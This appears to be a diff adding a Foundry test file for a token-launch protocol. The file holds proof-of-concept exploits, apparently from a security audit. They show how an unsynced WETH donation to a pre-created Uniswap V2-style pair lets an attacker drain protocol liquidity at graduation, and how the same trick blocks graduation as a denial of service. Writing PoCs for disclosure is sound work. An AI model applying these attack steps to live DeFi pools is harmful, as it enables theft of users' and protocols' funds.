@@ -1,0 +1,66 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.24;
+import {XofNTestBase} from "../helpers/XofNTestBase.sol";
+import {XofNCurve} from "../../contracts/XofNCurve.sol";
+import {XofNToken} from "../../contracts/XofNToken.sol";
+import {MockV2Pair} from "../mocks/MockUniswapV2.sol";
+import {console2} from "forge-std/console2.sol";
+
+contract PocTest is XofNTestBase {
+    XofNToken token; XofNCurve curve;
+    function setUp() public override { super.setUp(); (token, curve) = _launch(STANDARD, _eids(BASE, ARB)); }
+
+    function _attack(uint256 aTok, uint256 aEth, uint256 donEth) internal returns (uint256 tokOut, uint256 ethOut) {
+        uint256 bought = _buy(curve, attacker, 0.5 ether);
+        require(bought >= aTok, "not enough");
+        vm.deal(attacker, aEth + donEth);
+        vm.startPrank(attacker);
+        token.approve(address(chains[HOME].router), aTok);
+        chains[HOME].router.addLiquidityETHRaw{value: aEth}(address(token), aTok, attacker);
+        address pair = address(_pair(HOME, address(token)));
+        chains[HOME].weth.deposit{value: donEth}();
+        chains[HOME].weth.transfer(pair, donEth); // NO sync
+        vm.stopPrank();
+        vm.deal(alice, GRADUATION_THRESHOLD);
+        _buy(curve, alice, GRADUATION_THRESHOLD);
+        vm.prank(keeper);
+        graduator.graduate(address(token));
+        MockV2Pair p = _pair(HOME, address(token));
+        _logProt(p);
+        uint256 lp = p.balanceOf(attacker);
+        vm.startPrank(attacker);
+        p.transfer(address(p), lp);
+        (uint256 a0, uint256 a1) = p.burn(attacker);
+        vm.stopPrank();
+        (tokOut, ethOut) = p.token0() == address(token) ? (a0, a1) : (a1, a0);
+        console2.log("attacker out tokens (1e18)", tokOut / 1e18);
+        console2.log("attacker out eth (wei)    ", ethOut);
+    }
+    function _logProt(MockV2Pair p) internal view {
+        uint256 S = p.totalSupply();
+        (uint256 rt, uint256 re) = chains[HOME].router.reservesOf(address(token));
+        console2.log("protocol LP tokens (1e18)", p.balanceOf(LP_RECIPIENT) * rt / S / 1e18);
+        console2.log("protocol LP eth (wei)   ", p.balanceOf(LP_RECIPIENT) * re / S);
+    }
+    function test_unsyncedDonationSteal() public { _attack(30_000_000 ether, 0.3 ether, 5 ether); }
+
+    function test_unsyncedDonationDoS() public {
+        _buy(curve, attacker, 0.5 ether);
+        vm.deal(attacker, 4000 ether + 1001);
+        vm.startPrank(attacker);
+        token.approve(address(chains[HOME].router), 1001);
+        chains[HOME].router.addLiquidityETHRaw{value: 1001}(address(token), 1001, attacker);
+        address pair = address(_pair(HOME, address(token)));
+        chains[HOME].weth.deposit{value: 4000 ether}();
+        chains[HOME].weth.transfer(pair, 4000 ether);
+        vm.stopPrank();
+        vm.deal(alice, GRADUATION_THRESHOLD);
+        _buy(curve, alice, GRADUATION_THRESHOLD);
+        vm.prank(keeper);
+        vm.expectRevert(bytes("UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED"));
+        graduator.graduate(address(token));
+        // attacker recovers the donation
+        MockV2Pair(pair).skim(attacker);
+        assertEq(chains[HOME].weth.balanceOf(attacker), 4000 ether);
+    }
+}
